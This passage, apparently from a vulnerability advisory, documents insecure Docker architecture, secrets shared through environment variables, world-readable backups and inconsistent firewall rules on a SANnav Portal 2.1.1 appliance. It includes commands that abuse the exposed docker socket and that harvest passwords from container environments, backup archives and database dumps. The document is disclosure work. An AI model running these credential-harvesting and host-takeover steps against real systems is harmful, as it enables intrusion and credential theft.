<li>/dcm_2_1_1_authentication-rbac-middleware.1.d19zdz97oeaexukqqdo762vsp</li>
<li>/dcm_2_1_1_supportsave-mw.1.8k4nf2oed3rlmn00vk2c6udmp</li>
<li>/dcm_2_1_1_asyncjobscheduler-worker.1.u74e1dapsggi7tvl6cost8fgs</li>
<li>/dcm_2_1_1_license-mw.1.zs0l6gi0ciqw62cu2ql996biu</li>
<li>/dcm_2_1_1_externalapi-middleware.1.loovm2l8nx5y31mbuj5609u7r</li>
<li>/dcm_2_1_1_performancemanagement-datastore.1.qjfrhpjgsv8wfebsx29c2jg6b</li>
<li>/dcm_2_1_1_troubleshooting.1.tpipiw85xeojvc0syotzwabrs</li>
<li>/dcm_2_1_1_cfgmgmt-policy-middleware.1.q2d4eh0y3to2gc4req6wpw98j</li>
<li>/dcm_2_1_1_performancemanagement-statscollector.1.0bgfuh1nq4j7bib7fk6jwuvlj</li>
<li>/dcm_2_1_1_performancemanagement-middleware.1.m6wzmc73pgg26gwuhmpg1l74x</li>
<li>/dcm_2_1_1_switch-filetransfer-mw.1.ausaed37uog9jnzyxsrxgkmuo</li>
<li>/dcm_2_1_1_topology-middleware.1.tm0jcogi1oir1ufhy91m1pqqu</li>
<li>/dcm_2_1_1_flow-management-mw.1.jadot7kerrt6ywappso7khj86</li>
<li>/dcm_2_1_1_dashboard-middleware.1.0xas72iwheca6ix3axzeymqm1</li>
<li>/dcm_2_1_1_asyncjobscheduler-manager.1.v9bqrdh28ohchqpxmmwttejsd</li>
<li>/dcm_2_1_1_backuprestore-mw.1.zpqqmm5dxjwpd5vbaa91iqu9x</li>
<li>/dcm_2_1_1_g-agent.1.vaegzwy7vgmq7h0njq66fpso6</li>
<li>/dcm_2_1_1_collections-middleware.1.sg938jedpz5ca3n0c5pp0ynhi</li>
<li>/dcm_2_1_1_switch-asset-collectors-mw.1.38bqty706b9lvkbmn9ioegzkb</li>
<li>/dcm_2_1_1_fe-consolidated-2.1.ok1xeb9agbpjmkv1kes43cxdq</li>
<li>/dcm_2_1_1_filetransfer.1.uh461uxa4oa6fgrt1rsz1hac5</li>
<li>/dcm_2_1_1_faultmanagement-collector.1.mg7typw8ef0ph69itrahoes0m</li>
</ul>
<p>R/W Access to <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/data/filetransfer</code>:</p>
<ul>
<li>/dcm_2_1_1_faultmanagement-backend.1.ke6t2o5dtv1ieg41xw28r4q82</li>
<li>/dcm_2_1_1_asyncjobscheduler-worker.1.u74e1dapsggi7tvl6cost8fgs</li>
<li>/dcm_2_1_1_switch-filetransfer-mw.1.ausaed37uog9jnzyxsrxgkmuo</li>
<li>/dcm_2_1_1_fe-consolidated-2.1.ok1xeb9agbpjmkv1kes43cxdq</li>
<li>/dcm_2_1_1_filetransfer.1.uh461uxa4oa6fgrt1rsz1hac5</li>
</ul>
<p>R/W Access to <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/data/reports</code>:</p>
<ul>
<li>/dcm_2_1_1_faultmanagement-backend.1.ke6t2o5dtv1ieg41xw28r4q82</li>
<li>/dcm_2_1_1_asyncjobscheduler-worker.1.u74e1dapsggi7tvl6cost8fgs</li>
<li>/dcm_2_1_1_reportgenerator.1.43z628e4fvtyahtd4c7q5l12l</li>
<li>/dcm_2_1_1_dashboard-middleware.1.0xas72iwheca6ix3axzeymqm1</li>
<li>/dcm_2_1_1_backuprestore-mw.1.zpqqmm5dxjwpd5vbaa91iqu9x</li>
<li>/dcm_2_1_1_switch-asset-collectors-mw.1.38bqty706b9lvkbmn9ioegzkb</li>
<li>/dcm_2_1_1_fe-consolidated-2.1.ok1xeb9agbpjmkv1kes43cxdq</li>
<li>/dcm_2_1_1_dcm-postgres-db.1.mcdp2z3lp34d5isihk8lu6o6h</li>
</ul>
<p>R/W Access to <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/jre</code>:</p>
<ul>
<li>/dcm_2_1_1_dcm-wso2.1.0qs30j6381rjhdwnlbcbthe12</li>
<li>/dcm_2_1_1_dcm-postgres-db.1.mcdp2z3lp34d5isihk8lu6o6h</li>
</ul>
<p>R/W Access to <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/lib</code>:</p>
<ul>
<li>/dcm_2_1_1_dcm-wso2.1.0qs30j6381rjhdwnlbcbthe12</li>
<li>/dcm_2_1_1_dcm-postgres-db.1.mcdp2z3lp34d5isihk8lu6o6h</li>
</ul>
<p>R/W Access to <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs</code>:</p>
<ul>
<li>/dcm_2_1_1_dashboard-summaryprovider.1.u8uha7mufvmfphnwmanrzthgv</li>
<li>/dcm_2_1_1_fe-consolidated-1.1.cwc8pmrcwob0sivongcnw8o8m</li>
<li>/dcm_2_1_1_faultmanagement-backend.1.ke6t2o5dtv1ieg41xw28r4q82</li>
<li>/dcm_2_1_1_system-monitor.1.g6x4tf6jqfalrf0khluopbxdy</li>
<li>/dcm_2_1_1_ignite-grid-object-manager-node.1.knfke4xd2rutww916akawx0x4</li>
<li>/dcm_2_1_1_filters-contextsearch-middleware.1.tziel666fllkwfj1trxky958y</li>
<li>/dcm_2_1_1_authentication-rbac-middleware.1.d19zdz97oeaexukqqdo762vsp</li>
<li>/dcm_2_1_1_supportsave-mw.1.8k4nf2oed3rlmn00vk2c6udmp</li>
<li>/dcm_2_1_1_asyncjobscheduler-worker.1.u74e1dapsggi7tvl6cost8fgs</li>
<li>/dcm_2_1_1_license-mw.1.zs0l6gi0ciqw62cu2ql996biu</li>
<li>/dcm_2_1_1_externalapi-middleware.1.loovm2l8nx5y31mbuj5609u7r</li>
<li>/dcm_2_1_1_performancemanagement-datastore.1.qjfrhpjgsv8wfebsx29c2jg6b</li>
<li>/dcm_2_1_1_reportgenerator.1.43z628e4fvtyahtd4c7q5l12l</li>
<li>/dcm_2_1_1_troubleshooting.1.tpipiw85xeojvc0syotzwabrs</li>
<li>/dcm_2_1_1_cfgmgmt-policy-middleware.1.q2d4eh0y3to2gc4req6wpw98j</li>
<li>/dcm_2_1_1_performancemanagement-statscollector.1.0bgfuh1nq4j7bib7fk6jwuvlj</li>
<li>/dcm_2_1_1_performancemanagement-middleware.1.m6wzmc73pgg26gwuhmpg1l74x</li>
<li>/dcm_2_1_1_switch-filetransfer-mw.1.ausaed37uog9jnzyxsrxgkmuo</li>
<li>/dcm_2_1_1_topology-middleware.1.tm0jcogi1oir1ufhy91m1pqqu</li>
<li>/dcm_2_1_1_flow-management-mw.1.jadot7kerrt6ywappso7khj86</li>
<li>/dcm_2_1_1_dashboard-middleware.1.0xas72iwheca6ix3axzeymqm1</li>
<li>/dcm_2_1_1_asyncjobscheduler-manager.1.v9bqrdh28ohchqpxmmwttejsd</li>
<li>/dcm_2_1_1_backuprestore-mw.1.zpqqmm5dxjwpd5vbaa91iqu9x</li>
<li>/dcm_2_1_1_g-agent.1.vaegzwy7vgmq7h0njq66fpso6</li>
<li>/dcm_2_1_1_collections-middleware.1.sg938jedpz5ca3n0c5pp0ynhi</li>
<li>/dcm_2_1_1_dcm-wso2.1.0qs30j6381rjhdwnlbcbthe12</li>
<li>/dcm_2_1_1_switch-asset-collectors-mw.1.38bqty706b9lvkbmn9ioegzkb</li>
<li>/dcm_2_1_1_fe-consolidated-2.1.ok1xeb9agbpjmkv1kes43cxdq</li>
<li>/dcm_2_1_1_filetransfer.1.uh461uxa4oa6fgrt1rsz1hac5</li>
<li>/dcm_2_1_1_faultmanagement-collector.1.mg7typw8ef0ph69itrahoes0m</li>
</ul>
<p>R/W Access to <code>/var/run/docker.sock</code>:</p>
<ul>
<li>/dcm_2_1_1_system-monitor.1.g6x4tf6jqfalrf0khluopbxdy</li>
<li>/dcm_2_1_1_supportsave-mw.1.8k4nf2oed3rlmn00vk2c6udmp</li>
<li>/dcm_2_1_1_license-mw.1.zs0l6gi0ciqw62cu2ql996biu</li>
<li>/dcm_2_1_1_backuprestore-mw.1.zpqqmm5dxjwpd5vbaa91iqu9x</li>
</ul>
<p><a id="insecure-docker-architecture-and-configuration"></a></p>
<h2>Details - Insecure Docker architecture and configuration</h2>
<p>The appliance is based on 40 different Docker instances. A frontal nginx process is used to forward the traffic from the WAN interface to services running in Docker instances.</p>
<p>HTTP communication between the Docker instances is used to transfer information.</p>
<p>When analyzing the configuration of Dockers inside the appliances, some vulnerabilities were found.</p>
<p>The docker daemons are exposed on the WAN interface as shown in the <a href="#incorrect-firewall-rules">Incorrect firewall rules</a> part:</p>
<ul>
<li><code>2377/tcp</code> used for for cluster management;</li>
<li><code>7946/tcp</code> used for communication between the nodes;</li>
<li><code>7946/udp</code> used for communication between the nodes.</li>
</ul>
<p>We can find these ports using netstat:  </p>
<pre><code>[root@sannav-portal-v211 ~]# netstat -laputen|grep 2377
tcp6       0      0 :::2377                 :::*                    LISTEN      0          125620     42071/dockerd    
[root@sannav-portal-v211 ~]# netstat -laputen|grep 7946
tcp6       0      0 :::7946                 :::*                    LISTEN      0          124850     42071/dockerd    
udp6       0      0 :::7946                 :::*                                0          124851     42071/dockerd
</code></pre>
<p>And in the Docker configuration:</p>
<pre><code>[root@sannav-portal-v211 docker]# docker node inspect l2s19lz35s5veaec7gy9w01zc
[...]
        "Status": {
            "State": "ready",
            "Addr": "10.13.3.7"
        },  
        "ManagerStatus": {
            "Leader": true,
            "Reachability": "reachable",
            "Addr": "10.13.3.7:2377"
        }   
    }
</code></pre>
<p>In the 40 Docker instances running in the appliance, it was observed that 4 instances have a full access to the <code>/var/run/docker.sock</code> file, allowing a complete control over the appliance:</p>
<ul>
<li>dcm_2_1_1_system-monitor.1.g6x4tf6jqfalrf0khluopbxdy</li>
<li>dcm_2_1_1_supportsave-mw.1.8k4nf2oed3rlmn00vk2c6udmp</li>
<li>dcm_2_1_1_license-mw.1.zs0l6gi0ciqw62cu2ql996biu</li>
<li>dcm_2_1_1_backuprestore-mw.1.zpqqmm5dxjwpd5vbaa91iqu9x</li>
</ul>
<p>With the command <code>docker inspect target-instance</code>, it is possible to find the <code>/var/run/docker.sock</code> UNIX socket freely reachable. Access to this file provides a full access to the host.</p>
<pre><code>"Mounts": [
    {
        "Type": "bind",
        "Source": "/var/run/docker.sock",
        "Destination": "/var/run/docker.sock",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    },
</code></pre>
<p>A threat actor in these 4 instances can execute commands on the host using this command:</p>
<pre><code>$ docker -H unix:///var/run/docker.sock ps
</code></pre>
<p>We can confirm this UNIX socket is reachable from Docker instances:</p>
<pre><code>[root@sannav-portal-v211]# docker exec -it 40fa36431ed2 /bin/sh
/ # ls -la /var/run/docker.sock
srw-rw----    1 root     1001             0 Jan 1  2022 /var/run/docker.sock
/ #
</code></pre>
<p>The JAVA processes run as root inside the Docker instances:</p>
<pre><code>[root@sannav-portal-v211 ~]# ps -auxww | grep java|grep root
root      515566  2.8  1.2 11003420 616328 ?     Sl   Jul14 1126:32 java -Xms512m -Xmx512m -XX:MaxMetaspaceSize=256m -Dmanagement.security.enabled=false -XX:+ExitOnOutOfMemoryError -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/dcm1.0.0/logs/flow-management-mw.hprof -XX:+AlwaysPreTouch -XX:+UseG1GC -XX:+ScavengeBeforeFullGC -XX:+DisableExplicitGC -XX:+PrintGC -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=3 -XX:GCLogFileSize=100M -Xloggc:/dcm1.0.0/logs/flow-management-mw-2022-07-14_07-58-10-gc.log -XX:ErrorFile=/dcm1.0.0/logs/javaerror/flow-management-mw-hs_err.log -Dlogging.config=/dcm1.0.0/conf/logback/dcm-logback.xml -jar /dcm1.0.0/flow-management-mw-service-1.0.0.jar --server.port=7997
root     3980468  0.1  0.9 2256432 481188 ?      Sl   Mar31 330:51 java -Xms512m -Xmx512m -XX:MaxMetaspaceSize=128m -Dmanagement.security.enabled=false -XX:+ExitOnOutOfMemoryError -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/dcm1.0.0/logs/system-monitor.hprof -XX:+AlwaysPreTouch -XX:+UseG1GC -XX:+ScavengeBeforeFullGC -XX:+DisableExplicitGC -XX:+PrintGC -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=3 -XX:GCLogFileSize=100M -Xloggc:/dcm1.0.0/logs/system-monitor-2022-03-31_18-55-16-gc.log -XX:ErrorFile=/dcm1.0.0/logs/javaerror/system-monitor-hs_err.log -Dlogging.config=/dcm1.0.0/conf/logback/dcm-logback.xml -jar /dcm1.0.0/system-monitor-1.0.0.jar --server.port=7097
root     4160496  1.1  1.6 2778272 796456 ?      Sl   Mar31 2182:06 java -Xms256m -Xmx512m -XX:MaxMetaspaceSize=128m -Dmanagement.security.enabled=false -XX:+ExitOnOutOfMemoryError -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/dcm1.0.0/logs/asyncjobscheduler-manager.hprof -XX:+AlwaysPreTouch -XX:+UseG1GC -XX:+ScavengeBeforeFullGC -XX:+DisableExplicitGC -XX:+PrintGC -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=3 -XX:GCLogFileSize=100M -Xloggc:/dcm1.0.0/logs/asyncjobscheduler-manager-2022-03-31_19-53-06-gc.log -XX:ErrorFile=/dcm1.0.0/logs/javaerror/asyncjobscheduler-manager-hs_err.log -Dlogging.config=/dcm1.0.0/conf/logback/dcm-logback.xml -jar /dcm1.0.0/asyncjobscheduler-1.0.0.jar --server.port=7052
root     4160502  0.8  1.6 2762648 812208 ?      Sl   Mar31 1670:20 java -Xms512m -Xmx512m -XX:MaxMetaspaceSize=128m -Dmanagement.security.enabled=false -XX:+ExitOnOutOfMemoryError -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/dcm1.0.0/logs/license-mw.hprof -XX:+AlwaysPreTouch -XX:+UseG1GC -XX:+ScavengeBeforeFullGC -XX:+DisableExplicitGC -XX:+PrintGC -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=3 -XX:GCLogFileSize=100M -Xloggc:/dcm1.0.0/logs/license-mw-2022-03-31_19-53-06-gc.log -XX:ErrorFile=/dcm1.0.0/logs/javaerror/license-mw-hs_err.log -Dlogging.config=/dcm1.0.0/conf/logback/dcm-logback.xml -jar /dcm1.0.0/licensing-middleware-service-1.0.0.jar --server.port=7056
root     4160506  0.8  1.7 2659584 851636 ?      Sl   Mar31 1658:46 java -Xms256m -Xmx512m -XX:MaxMetaspaceSize=128m -Dmanagement.security.enabled=false -XX:+ExitOnOutOfMemoryError -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/dcm1.0.0/logs/troubleshooting-web.hprof -XX:+AlwaysPreTouch -XX:+UseG1GC -XX:+ScavengeBeforeFullGC -XX:+DisableExplicitGC -XX:+PrintGC -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=3 -XX:GCLogFileSize=100M -Xloggc:/dcm1.0.0/logs/troubleshooting-web-2022-03-31_19-53-06-gc.log -XX:ErrorFile=/dcm1.0.0/logs/javaerror/troubleshooting-web-hs_err.log -Dlogging.config=/dcm1.0.0/conf/logback/dcm-logback.xml -jar /dcm1.0.0/troubleshooting-service-1.0.0.jar --server.port=8094
</code></pre>
<p>In the appliance, the majority of programs run as root, as shown below:</p>
<pre><code>[root@sannav-portal-v211 ~]# ps -auxww|grep -v '\]$'|awk '{ print $1 }' | grep -v root | wc -l
85
[root@sannav-portal-v211 ~]# ps -auxww|grep -v '\]$'|awk '{ print $1 }' | grep root | wc -l
147
[root@sannav-portal-v211 ~]# ps -auxww | grep java|grep root|wc -l
34
</code></pre>
<p>147 programs run as root, including 34 Java processes.</p>
<p>We can confirm that the Java processes run as root inside Docker instances:</p>
<pre><code>[root@sannav-portal-v211 ssh]# for i in $(docker ps | awk '{ print $1 }'); do echo $i;docker exec -it $i bash -c 'ps -a';echo;done
b81a84ad73f4
PID   USER     TIME  COMMAND
    1 root      0:00 /bin/sh /dcm1.0.0/wait-for-spring-service.sh
   11 root     18h46 java -Xms512m -Xmx512m -XX:MaxMetaspaceSize=256m -Dmanagem
345336root      0:00 ps -a
[...]
6d72af69c4b1
PID   USER     TIME  COMMAND
    1 root      0:00 /bin/sh /dcm1.0.0/wait-for-spring-service.sh
  869 root      1d06 java -Xms512m -Xmx1024m -XX:MaxMetaspaceSize=256m -Dmanage
411632root      0:00 ps -a

bdf543f123c9
PID   USER     TIME  COMMAND
    1 root      0:00 /bin/sh /dcm1.0.0/wait-for-spring-service.sh
  869 root      1d04 java -Xms512m -Xmx1024m -XX:MaxMetaspaceSize=128m -Dmanage
381403root      0:00 ps -a

675c364f5167
PID   USER     TIME  COMMAND
    1 root      0:00 /bin/sh /dcm1.0.0/wait-for-spring-service.sh
  869 root      1d03 java -Xms256m -Xmx512m -XX:MaxMetaspaceSize=128m -Dmanagem
398478root      0:00 ps -a

871cc736d56d
PID   USER     TIME  COMMAND
    1 root      0:00 /bin/sh /dcm1.0.0/wait-for-spring-service.sh
  873 root     20h06 java -Xms256m -Xmx768m -XX:MaxMetaspaceSize=128m -Dmanagem
1346862 root      0:00 ps &lt;96&gt;a
[...]
</code></pre>
<p>There are also no firewall rules inside the Docker network, allowing any Docker instance to reach any Docker instance - the daemon listens on the main IPs addresses of the appliance (external IP: 10.13.3.7, 192.168.255.245 and 192.168.255.241).</p>
<p>There is a cAdvisor Docker instance freely reachable on port 18080 inside the Docker LAN listening on the WAN IP of the device:</p>
<p><img alt="" src="images/2024-sannav-cadvisor.png" /></p>
<p>The passwords are also shared between all the Docker instances using the environment variables as shown below:</p>
<pre><code>[root@sannav-portal-v211 ~]# for i in $(docker ps | awk '{ print $1 }'); do echo password-$i;docker exec -it $i env;done | grep 'security.pbe.key\|password'
password-b81a84ad73f4
dcm.internal.sftpScpServer.password=[REDACTED-HASHED-PASSWORD]
dcm.wso2cep.password=[REDACTED-HASHED-PASSWORD]
kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
security.pbe.key=[REDACTED-HASHED-PASSWORD]
password-67f747dafd14

password-cc9c3b6ec2d9
dcm.internal.sftpScpServer.password=[REDACTED-HASHED-PASSWORD]
dcm.wso2cep.password=[REDACTED-HASHED-PASSWORD]
kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
security.pbe.key=[REDACTED-HASHED-PASSWORD]

password-99ee9d76a50a
dcm.internal.sftpScpServer.password=[REDACTED-HASHED-PASSWORD]
dcm.wso2cep.password=[REDACTED-HASHED-PASSWORD]
kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
security.pbe.key=[REDACTED-HASHED-PASSWORD]

password-f90d98e286ae
dcm.internal.sftpScpServer.password=[REDACTED-HASHED-PASSWORD]
dcm.wso2cep.password=[REDACTED-HASHED-PASSWORD]
kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
security.pbe.key=[REDACTED-HASHED-PASSWORD]

password-44ab73ba64b7
dcm.internal.sftpScpServer.password=[REDACTED-HASHED-PASSWORD]
dcm.wso2cep.password=[REDACTED-HASHED-PASSWORD]
kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
security.pbe.key=[REDACTED-HASHED-PASSWORD]

password-f41e098298c0
dcm.internal.sftpScpServer.password=[REDACTED-HASHED-PASSWORD]
dcm.wso2cep.password=[REDACTED-HASHED-PASSWORD]
kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
security.pbe.key=[REDACTED-HASHED-PASSWORD]
[...]
</code></pre>
<p>These 32 Docker instances (on a total of 40) have access to these sensitive secrets. They also run root-owned java processes exposed on the network:</p>
<ul>
<li>dcm_2_1_1_flow-management-mw.1.jadot7kerrt6ywappso7khj86</li>
<li>dcm_2_1_1_schema-registry.1.jx0buz3bklbz0k6esjr0xo9nm</li>
<li>dcm_2_1_1_ignite-grid-node1.1.2je999qa8oemxtw6vq25be8zo</li>
<li>dcm_2_1_1_faultmanagement-collector.1.mg7typw8ef0ph69itrahoes0m</li>
<li>dcm_2_1_1_externalapi-middleware.1.loovm2l8nx5y31mbuj5609u7r</li>
<li>dcm_2_1_1_filetransfer.1.uh461uxa4oa6fgrt1rsz1hac5</li>
<li>dcm_2_1_1_collections-middleware.1.sg938jedpz5ca3n0c5pp0ynhi</li>
<li>dcm_2_1_1_asyncjobscheduler-manager.1.v9bqrdh28ohchqpxmmwttejsd</li>
<li>dcm_2_1_1_dcm-wso2.1.0qs30j6381rjhdwnlbcbthe12</li>
<li>dcm_2_1_1_cfgmgmt-policy-middleware.1.q2d4eh0y3to2gc4req6wpw98j</li>
<li>dcm_2_1_1_dashboard-middleware.1.0xas72iwheca6ix3axzeymqm1</li>
<li>dcm_2_1_1_troubleshooting.1.tpipiw85xeojvc0syotzwabrs</li>
<li>dcm_2_1_1_performancemanagement-statscollector.1.0bgfuh1nq4j7bib7fk6jwuvlj</li>
<li>dcm_2_1_1_performancemanagement-middleware.1.m6wzmc73pgg26gwuhmpg1l74x</li>
<li>dcm_2_1_1_asyncjobscheduler-worker.1.u74e1dapsggi7tvl6cost8fgs</li>
<li>dcm_2_1_1_switch-filetransfer-mw.1.ausaed37uog9jnzyxsrxgkmuo</li>
<li>dcm_2_1_1_authentication-rbac-middleware.1.d19zdz97oeaexukqqdo762vsp</li>
<li>dcm_2_1_1_ignite-grid-object-manager-node.1.knfke4xd2rutww916akawx0x4</li>
<li>dcm_2_1_1_switch-asset-collectors-mw.1.38bqty706b9lvkbmn9ioegzkb</li>
<li>dcm_2_1_1_dashboard-summaryprovider.1.u8uha7mufvmfphnwmanrzthgv</li>
<li>dcm_2_1_1_filters-contextsearch-middleware.1.tziel666fllkwfj1trxky958y</li>
<li>dcm_2_1_1_performancemanagement-datastore.1.qjfrhpjgsv8wfebsx29c2jg6b</li>
<li>dcm_2_1_1_faultmanagement-backend.1.ke6t2o5dtv1ieg41xw28r4q82</li>
<li>dcm_2_1_1_g-agent.1.vaegzwy7vgmq7h0njq66fpso6</li>
<li>dcm_2_1_1_topology-middleware.1.tm0jcogi1oir1ufhy91m1pqqu</li>
<li>dcm_2_1_1_supportsave-mw.1.8k4nf2oed3rlmn00vk2c6udmp</li>
<li>dcm_2_1_1_fe-consolidated-2.1.ok1xeb9agbpjmkv1kes43cxdq</li>
<li>dcm_2_1_1_fe-consolidated-1.1.cwc8pmrcwob0sivongcnw8o8m</li>
<li>dcm_2_1_1_system-monitor.1.g6x4tf6jqfalrf0khluopbxdy</li>
<li>dcm_2_1_1_reportgenerator.1.43z628e4fvtyahtd4c7q5l12l</li>
<li>dcm_2_1_1_elasticsearch.1.ie8a9gs8j7k5vpp7l872epobe</li>
<li>dcm_2_1_1_prometheus.1.yttg8cg3hjfprrvuevbnwmkb4</li>
</ul>
<p><a id="insecure-backup-process"></a></p>
<h2>Details - Insecure Backup process</h2>
<p>It is possible to backup the appliance from the web interface or the command line interface.
Using the web interface, you can visit https://10.13.3.7/#/settings/serverOption/backup to generate backups:</p>
<p><img alt="" src="images/2024-sannav-backup.png" /></p>
<p>The resulting backups are world-readable:</p>
<pre><code>[root@sannav-portal-v211 tmp]# ps -auxww|grep env
root     2569378  0.3  0.0  41032 24660 ?        Sl   06:53   0:00 docker run -i --rm --entrypoint /usr/bin/env --name createzip_1659696814521932635 --mount type=bind,source=/tmp/,target=/SANnav-backup --mount type=bind,source=/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/backuprestore/temp-dir-08-05-2022-06-52-42/dcm-ondemand-backup-08-05-2022-06-52-42/..,target=/SANnav-src -w /SANnav-src --network=host localhost:5000/mw-backuprestore:sann2.1.1 /bin/sh -c tar -cf - dcm-ondemand-backup-08-05-2022-06-52-42 | pv -L 10M | gzip &gt; /SANnav-backup/dcm-ondemand-backup-08-05-2022-06-52-42.tar.gz
root     2569617  0.0  0.0  12108   972 pts/0    S+   06:53   0:00 grep --color=auto env
[root@sannav-portal-v211 tmp]# ls -la /tmp
total 10768
drwxrwxrwt.  3 root root      139 Aug  5 06:53 .
dr-xr-xr-x. 18 root root      272 Jul 22  2020 ..
-rw-r--r--.  1 root root 11024588 Aug  5 06:54 dcm-ondemand-backup-08-05-2022-06-52-42.tar.gz
drwx------.  3 root root       17 Jan 1   2022 systemd-private-48490dcef7da46999ff932da82ed39b3-chronyd.service-RVYrMk
[root@sannav-portal-v211 nginx]# ls -latrZ /tmp/
total 10776
dr-xr-xr-x. 18 root root system_u:object_r:root_t:s0      272 Jul 22  2020 ..
drwx------.  3 root root system_u:object_r:tmp_t:s0        17 Jan 1   2022 systemd-private-48490dcef7da46999ff932da82ed39b3-chronyd.service-RVYrMk
-rw-r--r--.  1 root root system_u:object_r:tmp_t:s0  11032670 Aug  5 09:27 dcm-ondemand-backup-08-05-2022-09-26-14.tar.gz
drwxrwxrwt.  3 root root system_u:object_r:tmp_t:s0       139 Aug  5 09:28 .
[root@sannav-portal-v211 nginx]#
</code></pre>
<p>The backup file is a tarball that contains several configuration files.</p>
<p>We can find passwords in these files:</p>
<pre><code>kali% grep -I password
./core/compose/server_properties.env:# Password based encryption key
./core/compose/server_properties.env:kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
grep: ./core/esdump/indices/rsvxVZxPR9mXwMqEMT3Qtw/0/__LCoV6fj9RFqBAhx-ptzMnA: binary file matches
grep: ./core/esdump/indices/rsvxVZxPR9mXwMqEMT3Qtw/0/__aJtsmwiUSE2NgFzuKRlnyw: binary file matches
grep: ./core/pgdump/toc.dat: binary file matches
./core/conf/postgres/postgresql.conf:#password_encryption = on
./core/conf/postgres/database.properties:# Default password used when creating a new database connection
./core/conf/postgres/database.properties:database.password=[REDACTED-HASHED-PASSWORD]
./core/conf/server.properties:# Password based encryption key
./core/conf/server.properties:#WSO2 encrypted Password
./core/conf/server.properties:dcm.wso2cep.password=[REDACTED-HASHED-PASSWORD]
./core/conf/server.properties:# Default SFTP/SCP password
./core/conf/server.properties:dcm.internal.sftpScpServer.password=[REDACTED-HASHED-PASSWORD]
./core/conf/server.properties:kafka.keystore.password=[REDACTED-HASHED-PASSWORD]
</code></pre>
<p>The core/pgdump directory contains the entire Postgres database with the admin users and the configuration of the switches:</p>
<pre><code>kali% zcat core/pgdump/*|grep -I admin
[...]
3       1       \N      161     3       5       v3                      [REDACTED-CLEAR-TEXT-SNMPv3-PASSWORD]      \N      - None -                - None -                0
6       8       \N      161     3       5       v3                      [REDACTED-CLEAR-TEXT-SNMPv3-PASSWORD]      \N      - None -                - None -                0
[...]
1       admin2   Admin                   admin2   [REDACTED-HASHED-PASSWORD] 0               0       2022-01-01 00:00:01 1       0       0       2022-01-01 00:00:01-04     2022-01-01 00:00:0-05
[...]
3       admin                                   [REDACTED-HASHED-PASSWORD]           0               2       2022-01-01 00:00:01 1       0       0       2022-01-01 00:00:01-04      2022-01-01 00:00:01-04
1       85b557e6-3876-4e22-90c1-360f7916c975    \N      SWITCH    10:00:88:[REDACTED] -1      12      0       0       Subordinate     None    1     0
        HEALTHY 1045274 2022-01-01 00:00:01 2022-01-01 00:00:01 admin   [REDACTED-HASHED-PASSWORD]   0       Online  1       Switch Status is HEALTHY. Contributors: \N      \N      \N    1
        0       0       0       0       0       0       0       0       1       41739   0       1       0       0       0       2022-01-01 00:00:01 0     96       HEALTHY 0       0       48      1487489237423   0       0       0       0       Online  2
[...]
</code></pre>
<p>An attacker with a local access to the appliance can recover backup files.</p>
<p>These backup files can be restored into a new malicious appliance - the attacker will then be able to do an air-gapped analysis by sniffing the network interface of the malicious appliance and retrieve the passwords of all the switches. Reverse engineering of the custom encryption mechanism is also possible to retrieve the passwords.</p>
<p><a id="inconsistency-in-firewall-rules"></a></p>
<h2>Details - Inconsistency in firewall rules</h2>
<p>The appliance has firewall rules for IPv4 and IPv6 connectivities. We can extract these firewall rules using the tools iptables-save for IPv4 and ip6tables-save for IPv6. For example, for IPv4:</p>
<pre><code>[root@sannav-portal-v211 tmp]# iptables-save
-# Generated by iptables-save v1.8.4 on Fri Aug  5 06:15:11 2022
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [205949864:38460044561]
:INPUT_direct - [0:0]
:INPUT_ZONES_SOURCE - [0:0]
:INPUT_ZONES - [0:0]
:FORWARD_direct - [0:0]
:FORWARD_IN_ZONES_SOURCE - [0:0]
:FORWARD_IN_ZONES - [0:0]
:FORWARD_OUT_ZONES_SOURCE - [0:0]
[...]
</code></pre>
<p>When comparing the firewall rules used for IPv4 and IPv6 connectivities, we can detect several inconsistencies:</p>
<ul>
<li>A specific rule in IPv6, that does not exist in IPv4, accepts any UDP packet to the port 546  from the link-local IPv6 addresses:</li>
</ul>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>-A IN_public_allow -d fe80::/64 -p udp -m udp --dport <span style="color: #666666">546</span> -m conntrack --ctstate NEW,UNTRACKED -j ACCEPT
</pre></div>

<ul>
<li>Specific TCP port ranges are dropped in IPv4 - these 2 rules do not exist in IPv6 and the packets are then not dropped:</li>
</ul>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>-A SANNAV-CHAIN -i ens192 -p tcp -m multiport --dports <span style="color: #666666">47100</span>:47125 -j DROP
-A SANNAV-CHAIN -i ens192 -p tcp -m multiport --dports <span style="color: #666666">10800</span>:10825 -j DROP
